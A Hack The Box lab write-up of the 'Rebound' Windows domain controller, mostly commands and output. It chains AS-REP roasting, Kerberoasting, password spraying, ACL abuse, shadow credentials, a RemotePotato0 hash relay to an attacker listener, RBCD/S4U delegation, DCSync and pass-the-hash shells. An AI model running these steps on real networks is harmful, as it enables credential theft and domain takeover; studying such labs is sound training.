# Rebound — Hack The Box Writeup
**Difficulty:** Insane  
**OS:** Windows (Active Directory)  
**IP:** `10.129.xx.xx`  

---

## Table of Contents
1. [Enumeration](#1-enumeration)
2. [SMB Guest Access & Share Enumeration](#2-smb-guest-access--share-enumeration)
3. [SID Brute-Forcing / User Enumeration](#3-sid-brute-forcing--user-enumeration)
4. [AS-REP Roasting](#4-as-rep-roasting)
5. [Kerberoasting without Pre-Auth (jjones)](#5-kerberoasting-without-pre-auth-jjones)
6. [Password Reuse Check & Access as oorend](#6-password-reuse-check--access-as-oorend)
7. [BloodHound Enumeration](#7-bloodhound-enumeration)
8. [Abusing AddSelf → ServiceMgmt → GenericAll Chain](#8-abusing-addself--servicemgmt--genericall-chain)
9. [Shadow Credentials Attack → winrm_svc](#9-shadow-credentials-attack--winrm_svc)
10. [Initial Foothold — WinRM as winrm_svc](#10-initial-foothold--winrm-as-winrm_svc)
11. [Session Hunting & RemotePotato0 (tbrady NTLMv2 Capture)](#11-session-hunting--remotepotato0-tbrady-ntlmv2-capture)
12. [Cracking tbrady's Hash & GMSA Password Read](#12-cracking-tbradys-hash--gmsa-password-read)
13. [Resource-Based Constrained Delegation (RBCD) Setup](#13-resource-based-constrained-delegation-rbcd-setup)
14. [S4U2Self → S4U2Proxy Chain → DCSync](#14-s4u2self--s4u2proxy-chain--dcsync)
15. [Domain Compromise — Administrator Shell](#15-domain-compromise--administrator-shell)
16. [Detailed Step-by-Step Summary](#16-detailed-step-by-step-summary)

---

## 1. Enumeration

Start with a full service/version scan against the target:

```bash
nmap -sV -sC 10.129.xx.xx
```

**Results (key ports):**

| Port | Service | Notes |
|------|---------|-------|
| 53 | DNS | Simple DNS Plus |
| 88 | Kerberos | Windows KDC |
| 135/593 | MSRPC | RPC over HTTP |
| 139/445 | SMB | Windows Server 2019, SMB signing **required** |
| 389/636/3268/3269 | LDAP/LDAPS | Domain: `rebound.htb` |
| 464 | kpasswd5 | Kerberos password change |
| 5985 | WinRM | HTTP API |

Key findings from Nmap:
- Domain: `rebound.htb`
- Hostname: `DC01` (Domain Controller)
- **SMB signing enforced** — rules out relay attacks directly
- **Clock skew ~7 hours** — important for Kerberos; must sync time before ticket operations

> **Note on Clock Skew:** Kerberos requires clocks to be within 5 minutes. With a ~7h skew, use `faketime` or `ntpdate`/`rdate` against the DC before performing Kerberos attacks. All ticket-based commands in this writeup assume time has been synced appropriately (e.g., `sudo rdate -n dc01.rebound.htb` or `sudo faketime -f '+7h' <command>`).

**/etc/hosts setup:**

```
10.129.xx.xx   rebound.htb dc01.rebound.htb dc01
```

---

## 2. SMB Guest Access & Share Enumeration

Test for guest/null authentication:

```bash
nxc smb rebound.htb -u guest -p ''
```

```
SMB   10.129.xx.xx   445   DC01   [+] rebound.htb\guest:
```

Guest auth works. Enumerate shares:

```bash
nxc smb rebound.htb -u guest -p '' --shares
```

```
Share        Permissions     Remark
-----        -----------     ------
ADMIN$                       Remote Admin
C$                           Default share
IPC$         READ            Remote IPC
NETLOGON                     Logon server share
Shared       READ
SYSVOL                       Logon server share
```

We have READ on `IPC$` and `Shared`. Manually browsing `Shared` reveals nothing interesting. However, `IPC$` read access is valuable — it enables us to perform SID brute-forcing via `lsarpc`.

---

## 3. SID Brute-Forcing / User Enumeration

Using `impacket-lookupsid` via the guest account (blank password) against the `lsarpc` named pipe:

```bash
impacket-lookupsid guest@rebound.htb
```

**Output (default max RID 4000):**

```
[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
500: rebound\Administrator (SidTypeUser)
501: rebound\Guest (SidTypeUser)
502: rebound\krbtgt (SidTypeUser)
...
1951: rebound\ppaul (SidTypeUser)
2952: rebound\llune (SidTypeUser)
3382: rebound\fflock (SidTypeUser)
```

The RID gaps are large (e.g., 1951 → 2952 → 3382), suggesting there may be more accounts above RID 4000. Re-run with a higher max:

```bash
impacket-lookupsid guest@rebound.htb 10000
```

**Additional users discovered:**

```
5277: rebound\jjones (SidTypeUser)
5569: rebound\mmalone (SidTypeUser)
5680: rebound\nnoon (SidTypeUser)
7681: rebound\ldap_monitor (SidTypeUser)
7682: rebound\oorend (SidTypeUser)
7683: rebound\ServiceMgmt (SidTypeGroup)
7684: rebound\winrm_svc (SidTypeUser)
7685: rebound\batch_runner (SidTypeUser)
7686: rebound\tbrady (SidTypeUser)
7687: rebound\delegator$ (SidTypeUser)   <-- GMSA account (note the $)
```

Save all usernames to `users.txt`:

```
ppaul
llune
fflock
jjones
mmalone
nnoon
ldap_monitor
oorend
winrm_svc
batch_runner
tbrady
```

---

## 4. AS-REP Roasting

With a list of usernames and no credentials yet, check for accounts that don't require Kerberos pre-authentication (`UF_DONT_REQUIRE_PREAUTH`):

```bash
impacket-GetNPUsers rebound.htb/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -no-pass
```

**Results:**

```
[-] User ppaul doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User llune doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fflock doesn't have UF_DONT_REQUIRE_PREAUTH set
[+] $krb5asrep$23$jjones@REBOUND.HTB:<hash_redacted>
[-] User mmalone doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nnoon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ldap_monitor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User oorend doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User winrm_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User batch_runner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tbrady doesn't have UF_DONT_REQUIRE_PREAUTH set
```

**jjones** has pre-auth disabled — AS-REP hash captured. Attempt to crack it:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
0g 0:00:00:16 DONE — Session completed.
```

**No crack.** The AS-REP hash for `jjones` could not be cracked with rockyou. However, we can still leverage `jjones`'s no-preauth status in the next step.

---

## 5. Kerberoasting without Pre-Auth (jjones)

Since `jjones` doesn't require pre-authentication, we can use their identity to request Kerberos Service Tickets for other accounts (SPNs) — without knowing jjones's password. This is the **Kerberoast without pre-auth** technique.

> **Reference:** https://www.thehacker.recipes/ad/movement/kerberos/kerberoast#kerberoast-wo-pre-authentication

```bash
impacket-GetUserSPNs -no-preauth jjones -request -usersfile users.txt rebound.htb/ -dc-ip 10.129.xx.xx
```

**Results:**

```
[-] Principal: ppaul - KDC_ERR_S_PRINCIPAL_UNKNOWN
[-] Principal: llune - KDC_ERR_S_PRINCIPAL_UNKNOWN
[-] Principal: fflock - KDC_ERR_S_PRINCIPAL_UNKNOWN
[-] Principal: jjones - KDC_ERR_S_PRINCIPAL_UNKNOWN
[-] Principal: mmalone - KDC_ERR_S_PRINCIPAL_UNKNOWN
[-] Principal: nnoon - KDC_ERR_S_PRINCIPAL_UNKNOWN
[+] $krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$<hash_redacted>
[-] Principal: oorend - KDC_ERR_S_PRINCIPAL_UNKNOWN
[-] Principal: winrm_svc - KDC_ERR_S_PRINCIPAL_UNKNOWN
[-] Principal: batch_runner - KDC_ERR_S_PRINCIPAL_UNKNOWN
[-] Principal: tbrady - KDC_ERR_S_PRINCIPAL_UNKNOWN
```

`ldap_monitor` has an SPN registered — TGS ticket captured. Crack it:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
<password_redacted>    (ldap_monitor)
1g 0:00:00:06 DONE
```

**Password cracked for `ldap_monitor`.**

Verify credentials:

```bash
nxc smb rebound.htb -u ldap_monitor -p '<password_redacted>'
```

```
SMB   10.129.xx.xx   445   DC01   [+] rebound.htb\ldap_monitor:<password_redacted>
```

---

## 6. Password Reuse Check & Access as oorend

With valid credentials for `ldap_monitor`, spray the cracked password across all discovered users to check for password reuse:

```bash
nxc smb rebound.htb -u users.txt -p '<password_redacted>' --continue-on-success
```

**Results:**

```
[-] rebound.htb\ppaul:<password_redacted> STATUS_LOGON_FAILURE
[-] rebound.htb\llune:<password_redacted> STATUS_LOGON_FAILURE
[-] rebound.htb\fflock:<password_redacted> STATUS_LOGON_FAILURE
[-] rebound.htb\jjones:<password_redacted> STATUS_LOGON_FAILURE
[-] rebound.htb\mmalone:<password_redacted> STATUS_LOGON_FAILURE
[-] rebound.htb\nnoon:<password_redacted> STATUS_LOGON_FAILURE
[+] rebound.htb\ldap_monitor:<password_redacted>
[+] rebound.htb\oorend:<password_redacted>      <-- PASSWORD REUSE!
[-] rebound.htb\winrm_svc:<password_redacted> STATUS_LOGON_FAILURE
[-] rebound.htb\batch_runner:<password_redacted> STATUS_LOGON_FAILURE
[-] rebound.htb\tbrady:<password_redacted> STATUS_LOGON_FAILURE
```

**`oorend` reuses the same password as `ldap_monitor`.** This is a significant finding.

---

## 7. BloodHound Enumeration

Collect AD data using `bloodhound-python` with `ldap_monitor` credentials:

```bash
bloodhound-python -u 'ldap_monitor' -p '<password_redacted>' -d rebound.htb \
  -dc DC01.rebound.htb -ns 10.129.xx.xx --dns-tcp -c All
```

```
INFO: Found 1 domains
INFO: Found 16 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Done in 01M 14S
```

> **Note:** LDAP signing is enforced, so bloodhound-python automatically falls back to LDAPS.

Import the JSON files into BloodHound and analyze the graph. Key attack paths discovered:

```
oorend --[AddSelf]--> ServiceMgmt --[GenericAll]--> OU=Service Users
OU=Service Users --[Contains]--> winrm_svc
OU=Service Users --[Contains]--> batch_runner
```
```
tbrady --[ReadGMSAPassword]--> delegator$
delegator$ --[AllowedToDelegate]--> http/dc01.rebound.htb
```

This gives us a clear multi-step attack chain.

---

## 8. Abusing AddSelf → ServiceMgmt → GenericAll Chain

**Step 1:** `oorend` has `AddSelf` on the `ServiceMgmt` group — meaning `oorend` can add themselves to it:

```bash
bloodyad -d rebound.htb -u oorend -p '<password_redacted>' \
  --host dc01.rebound.htb add groupMember ServiceMGMT oorend
```

```
[+] oorend added to ServiceMGMT
```

**Step 2:** `ServiceMgmt` has `GenericAll` over the `OU=Service Users`. Now that `oorend` is a member of `ServiceMgmt`, verify what `oorend` can write to:

```bash
bloodyad -d rebound.htb -u oorend -p '<password_redacted>' \
  --host dc01.rebound.htb get writable
```

**Pre-GenericAll output (relevant):**

```
distinguishedName: OU=Service Users,DC=rebound,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE
```

`oorend` can write the DACL on the `Service Users` OU. Grant `oorend` `GenericAll` over it:

```bash
bloodyad -d rebound.htb -u oorend -p '<password_redacted>' \
  --host dc01.rebound.htb add genericAll \
  'OU=Service Users,DC=rebound,DC=htb' oorend
```

```
[+] oorend has now GenericAll on OU=Service Users,DC=rebound,DC=htb
```

**Step 3:** Verify the new permissions propagated to objects inside the OU:

```bash
bloodyad -d rebound.htb -u oorend -p '<password_redacted>' \
  --host dc01.rebound.htb get writable
```

**Post-GenericAll output:**

```
distinguishedName: CN=winrm_svc,OU=Service Users,DC=rebound,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=batch_runner,OU=Service Users,DC=rebound,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE
```

`oorend` now has full control over `winrm_svc` and `batch_runner`.

**Step 4 (Attempted):** Try to set a new password for `winrm_svc` directly:

```bash
bloodyad -d rebound.htb -u oorend -p '<password_redacted>' \
  --host dc01.rebound.htb set password winrm_svc abc@123
```

```
LDAPModifyException: Password can't be changed before -2 days, 23:58:32
because of the minimum password age policy.
```

**Blocked by minimum password age policy.** We need an alternative path.

---

## 9. Shadow Credentials Attack → winrm_svc

Since we can't change the password directly, we use a **Shadow Credentials** attack (Key Credential Link abuse) to authenticate as `winrm_svc` without knowing or changing their password.

> **Reference:** https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab  
> **Tool:** `certipy shadow auto`

The attack works by writing a Key Credential (certificate-based) to the target account's `msDS-KeyCredentialLink` attribute. Since `oorend` has GenericAll on `winrm_svc`, we can write this attribute. The account can then pre-authenticate with the certificate to obtain a TGT (and from that, extract the NT hash via PKINIT).

```bash
certipy shadow auto -u oorend@rebound.htb -p '<password_redacted>' \
  -account winrm_svc -target dc01.rebound.htb -dc-ip 10.129.xx.xx
```

```
[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '2eaae766370f42f3b5aa846b777aa379'
[*] Adding Key Credential to 'winrm_svc'
[*] Successfully added Key Credential
[*] Authenticating as 'winrm_svc' with the certificate
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': <hash_redacted>
```

NT hash obtained for `winrm_svc`. The tool also automatically cleans up the added Key Credential, restoring the original state.

---

## 10. Initial Foothold — WinRM as winrm_svc

Pass the NT hash via Evil-WinRM:

```bash
evil-winrm -i rebound.htb -u winrm_svc -H <hash_redacted>
```

```
Evil-WinRM shell v3.9
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents>
```

**User flag:**

```powershell
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> type ../Desktop/user.txt
[REDACTED]
```

---

## 11. Session Hunting & RemotePotato0 (tbrady NTLMv2 Capture)

From BloodHound, `tbrady` is a high-value account (has ReadGMSAPassword rights over `delegator$`). Check for active sessions first:

```powershell
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> qwinsta
qwinsta.exe : No session exists for *
```

No session visible from `winrm_svc`'s perspective (network logon sessions don't show). Re-run BloodHound collection using SharpHound from the box to get fresh local session data. Results show `tbrady` has an **active console session (session ID 1)**.

Confirm via `RunasCs.exe` to query session info at a higher token level:

```powershell
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> .\RunasCs.exe x x qwinsta -l 9

 SESSIONNAME       USERNAME     ID   STATE   TYPE   DEVICE
>services                        0   Disc
 console           tbrady        1   Active
```

`tbrady` is active in session 1. We can use **RemotePotato0** to coerce `tbrady`'s authentication from that session and capture their NTLMv2 hash.

> **Reference:** https://github.com/antonioCoco/RemotePotato0  
> RemotePotato0 abuses the `StandardGetInstanceFromIStorage` COM activation to force a cross-session NTLM authentication that gets relayed to our listener.

**On attacker machine — forward port 135 to catch the RogueOxidResolver callback:**

```bash
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.xx.xx:9999
```

**On victim (winrm_svc shell) — trigger RemotePotato0 targeting session 1:**

```powershell
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> .\RemotePotato0.exe -m 2 -s 1 -x 10.10.xx.xx -p 9999
```

```
[*] Starting the RPC server to capture the credentials hash
[*] Spawning COM object in the session: 1
[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-...}
[*] RPC relay server listening on port 9997...
[*] Starting RogueOxidResolver RPC Server on port 9999...
[+] Received the relayed authentication on the RPC relay server
[+] User hash stolen!

NTLMv2 Username : rebound\tbrady
NTLMv2 Hash     : tbrady::rebound:<hash_redacted>
```

**tbrady's NTLMv2 hash captured.**

---

## 12. Cracking tbrady's Hash & GMSA Password Read

Crack the NTLMv2 hash:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
<password_redacted>    (tbrady)
1g 0:00:00:06 DONE
```

Verify:

```bash
nxc smb rebound.htb -u tbrady -p '<password_redacted>'
```

```
SMB   10.129.xx.xx   445   DC01   [+] rebound.htb\tbrady:<password_redacted>
```

Now read the **GMSA password** for `delegator$`. BloodHound shows `tbrady --[ReadGMSAPassword]--> delegator$`:

```bash
nxc ldap rebound.htb -u tbrady -p '<password_redacted>' --gmsa
```

```
[+] rebound.htb\tbrady:<password_redacted>
[*] Getting GMSA Passwords
Account: delegator$    NTLM: <hash_redacted>    PrincipalsAllowedToReadPassword: tbrady
```

**GMSA NT hash for `delegator$` obtained.**

BloodHound also confirms the delegation path:

```
delegator$ --[AllowedToDelegate]--> http/dc01.rebound.htb   (Constrained Delegation w/o Protocol Transition)
```

**Initial Attempt — Direct S4U2Proxy as Administrator:**

```bash
impacket-getST -spn cifs/dc01.rebound.htb -impersonate administrator \
  'rebound.htb/delegator$' -hashes :<hash_redacted>
```

```
[-] KDC_ERR_BADOPTION — Probably SPN is not allowed to delegate or TGT not forwardable
```

Check why — query the Administrator object for its UAC flags:

```bash
bloodyad -d rebound.htb -u oorend -p '<password_redacted>' \
  --host dc01.rebound.htb get object "Administrator"
```

```
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD; NOT_DELEGATED
```

Administrator has `NOT_DELEGATED` set — the KDC won't issue a forwardable ticket for them, so S4U2Proxy fails. We pivot to impersonating `DC01$` (the machine account), which doesn't have this restriction.

---

## 13. Resource-Based Constrained Delegation (RBCD) Setup

The plan:
- Set up RBCD so that `ldap_monitor` can impersonate users on `delegator$` (via S4U2Proxy)
- This gives us a forwardable S4U2Self ticket for `DC01$` that `delegator$` can then use for its own constrained delegation to `http/dc01.rebound.htb`

> **Reference:** https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd

`delegator$` (GMSA) can write its own `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. We use its NT hash to grant `ldap_monitor` RBCD rights over it:

```bash
impacket-rbcd 'rebound.htb/delegator$' \
  -hashes :<hash_redacted> \
  -k \
  -delegate-from ldap_monitor \
  -delegate-to 'delegator$' \
  -action write \
  -dc-ip dc01.rebound.htb \
  -use-ldaps
```

```
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ldap_monitor can now impersonate users on delegator$ via S4U2Proxy
[*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)
```

Verify the full delegation chain:

```bash
impacket-findDelegation 'rebound.htb/ldap_monitor:<password_redacted>' \
  -dc-ip 10.129.xx.xx -k
```

```
AccountName    AccountType                           DelegationType                        DelegationRightsTo
-----------    -----------                           --------------                        ------------------
DC01$          Computer                              Unconstrained                         N/A
ldap_monitor   Person                                Resource-Based Constrained            delegator$
delegator$     ms-DS-Group-Managed-Service-Account   Constrained w/o Protocol Transition   http/dc01.rebound.htb
```

Also confirm `delegator$`'s SPN:

```bash
bloodyad -d rebound.htb -u oorend -p '<password_redacted>' \
  --host dc01.rebound.htb get object "delegator$"
```

```
servicePrincipalName: browser/dc01.rebound.htb
msDS-AllowedToDelegateTo: http/dc01.rebound.htb
```

`delegator$` has SPN `browser/dc01.rebound.htb` — this is the target for our S4U2Self step.

---

## 14. S4U2Self → S4U2Proxy Chain → DCSync

This is a chained delegation attack across three accounts. Full flow:

```
ldap_monitor  --[S4U2Self for DC01$ via RBCD]--> delegator$ (browser/dc01.rebound.htb)
delegator$    --[S4U2Proxy for DC01$]-----------> http/dc01.rebound.htb (Constrained Delegation)
DC01$         --[DCSync via DRSUAPI]------------> dump NTDS
```

> **Reference:** https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained#without-protocol-transition

**Step 1 — Get a forwardable ticket for `DC01$` on `delegator$`'s SPN via RBCD:**

`ldap_monitor` (which now has RBCD over `delegator$`) performs S4U2Self + S4U2Proxy to get a ticket for `DC01$` on `browser/dc01.rebound.htb`:

```bash
impacket-getST 'rebound.htb/ldap_monitor:<password_redacted>' \
  -spn browser/dc01.rebound.htb \
  -impersonate DC01$
```

```
[*] Getting TGT for user
[*] Impersonating DC01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache
```

**Step 2 — Use `delegator$`'s constrained delegation to escalate to `http/dc01.rebound.htb` as `DC01$`:**

Since `delegator$` uses constrained delegation *without protocol transition*, it cannot perform S4U2Self on its own — it needs an existing ticket to pass along. We supply the ticket from Step 1 as `-additional-ticket`:

```bash
impacket-getST -spn http/dc01.rebound.htb \
  -impersonate 'DC01$' \
  'rebound.htb/delegator$' \
  -hashes :<hash_redacted> \
  -additional-ticket 'DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache'
```

```
[*] Getting TGT for user
[*] Impersonating DC01$
[*]     Using additional ticket DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache instead of S4U2Self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache
```

**Step 3 — Export the ticket and run DCSync as `DC01$`:**

Domain Controllers have replication rights (`DS-Replication-Get-Changes`, `DS-Replication-Get-Changes-All`). By impersonating `DC01$`, we can use the DRSUAPI protocol to dump the NTDS:

```bash
export KRB5CCNAME='DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache'

impacket-secretsdump -no-pass -k dc01.rebound.htb -just-dc-user Administrator
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<hash_redacted>:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:<key_redacted>
Administrator:aes128-cts-hmac-sha1-96:<key_redacted>
Administrator:des-cbc-md5:<key_redacted>
[*] Cleaning up...
```

**Administrator NT hash obtained.**

---

## 15. Domain Compromise — Administrator Shell

Pass the Administrator hash via Evil-WinRM:

```bash
evil-winrm -i rebound.htb -u Administrator -H <hash_redacted>
```

```
Evil-WinRM shell v3.9
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

**Root flag:**

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
[REDACTED]
```

**Domain fully compromised.**

---

## 16. Detailed Step-by-Step Summary

| # | Step | Tool | Result |
|---|------|------|--------|
| 1 | Port scan | `nmap -sV -sC` | DC01 at `10.129.xx.xx`, domain `rebound.htb`, SMB signing enforced, WinRM open, ~7h clock skew noted |
| 2 | SMB guest auth | `nxc smb -u guest -p ''` | Guest login works; `IPC$` and `Shared` readable; `Shared` is empty |
| 3 | SID brute-force (default RID 4000) | `impacket-lookupsid guest@ 4000` | 3 users found (ppaul, llune, fflock) — large RID gaps hint at more |
| 4 | SID brute-force (extended RID 10000) | `impacket-lookupsid guest@ 10000` | 8 more users found, including `delegator$` GMSA, `winrm_svc`, `tbrady` |
| 5 | AS-REP Roasting | `impacket-GetNPUsers` | `jjones` has no pre-auth; AS-REP hash captured but **not cracked** with rockyou |
| 6 | Kerberoast without pre-auth | `impacket-GetUserSPNs -no-preauth jjones` | `ldap_monitor` TGS captured using jjones's AS-REP; cracked → password obtained |
| 7 | Verify `ldap_monitor` creds | `nxc smb` | Confirmed valid |
| 8 | Password spray across all users | `nxc smb -u users.txt -p <pw> --continue-on-success` | `oorend` reuses exact same password as `ldap_monitor` |
| 9 | BloodHound AD collection | `bloodhound-python -c All` (falls back to LDAPS) | Attack chain revealed: `oorend→ServiceMgmt→OU Service Users→winrm_svc` and `tbrady→delegator$→DC01` |
| 10 | AddSelf to ServiceMgmt | `bloodyad add groupMember ServiceMGMT oorend` | `oorend` joins `ServiceMgmt` group, inheriting its ACL rights |
| 11 | Grant GenericAll on Service Users OU | `bloodyad add genericAll 'OU=Service Users...' oorend` | `oorend` gains full write control over OU and its members |
| 12 | Attempt direct password change | `bloodyad set password winrm_svc abc@123` | **Blocked** — minimum password age policy prevents it |
| 13 | Shadow Credentials attack on winrm_svc | `certipy shadow auto` | Key Credential written; TGT obtained via PKINIT; NT hash extracted; KC restored automatically |
| 14 | WinRM as winrm_svc | `evil-winrm -H <hash>` | Shell obtained; **user.txt captured** |
| 15 | Session enumeration | `qwinsta` (blank), then `RunasCs.exe x x qwinsta -l 9` + SharpHound | `tbrady` confirmed active in console session 1 |
| 16 | Cross-session NTLM capture | `RemotePotato0.exe -m 2 -s 1` + `socat` relay on attacker | `tbrady` NTLMv2 hash captured |
| 17 | Crack tbrady NTLMv2 | `john` + rockyou | Password cracked |
| 18 | Read GMSA password for delegator$ | `nxc ldap --gmsa` (as tbrady) | `delegator$` NT hash obtained |
| 19 | Direct S4U2Proxy as Administrator (failed) | `impacket-getST -impersonate administrator` | **Failed** — KDC_ERR_BADOPTION |
| 20 | Diagnose failure | `bloodyad get object "Administrator"` | Confirmed `NOT_DELEGATED` UAC flag; pivot to impersonating `DC01$` |
| 21 | Setup RBCD: ldap_monitor → delegator$ | `impacket-rbcd -delegate-from ldap_monitor -delegate-to delegator$` | `ldap_monitor` can now impersonate users on `delegator$` via S4U2Proxy |
| 22 | Verify full delegation chain | `impacket-findDelegation` | Confirmed: RBCD `ldap_monitor→delegator$` + Constrained `delegator$→http/dc01` |
| 23 | S4U2Self for DC01$ via RBCD | `impacket-getST ldap_monitor -impersonate DC01$ -spn browser/dc01` | Forwardable ST for `DC01$` on `delegator$` obtained |
| 24 | S4U2Proxy via Constrained Delegation | `impacket-getST delegator$ -impersonate DC01$ -spn http/dc01 -additional-ticket` | ST for `DC01$` on `http/dc01.rebound.htb` obtained |
| 25 | DCSync as DC01$ | `impacket-secretsdump -no-pass -k dc01.rebound.htb` | Administrator NT hash dumped via DRSUAPI |
| 26 | Admin shell | `evil-winrm -H <hash>` | Administrator shell; **root.txt captured** |

---

### Key Techniques Reference

| Technique | Reference |
|-----------|-----------|
| AS-REP Roasting | https://www.thehacker.recipes/ad/movement/kerberos/asreproast |
| Kerberoast without Pre-Auth | https://www.thehacker.recipes/ad/movement/kerberos/kerberoast#kerberoast-wo-pre-authentication |
| Shadow Credentials (Key Credential Link) | https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab |
| Resource-Based Constrained Delegation | https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd |
| Constrained Delegation w/o Protocol Transition | https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained#without-protocol-transition |
| RemotePotato0 Cross-Session Relay | https://github.com/antonioCoco/RemotePotato0 |
| GMSA Password Read Abuse | https://www.thehacker.recipes/ad/movement/credentials/dumping/gmsa |

---

*Full attack chain: Unauthenticated → AS-REP Roast (jjones) → Kerberoast w/o pre-auth (ldap_monitor) → Password reuse (oorend) → ACL abuse chain (AddSelf→GenericAll) → Shadow Credentials (winrm_svc) → WinRM foothold → RemotePotato0 cross-session relay (tbrady) → GMSA read (delegator$) → RBCD setup → Chained S4U2Self/S4U2Proxy → DCSync → Domain Admin.*
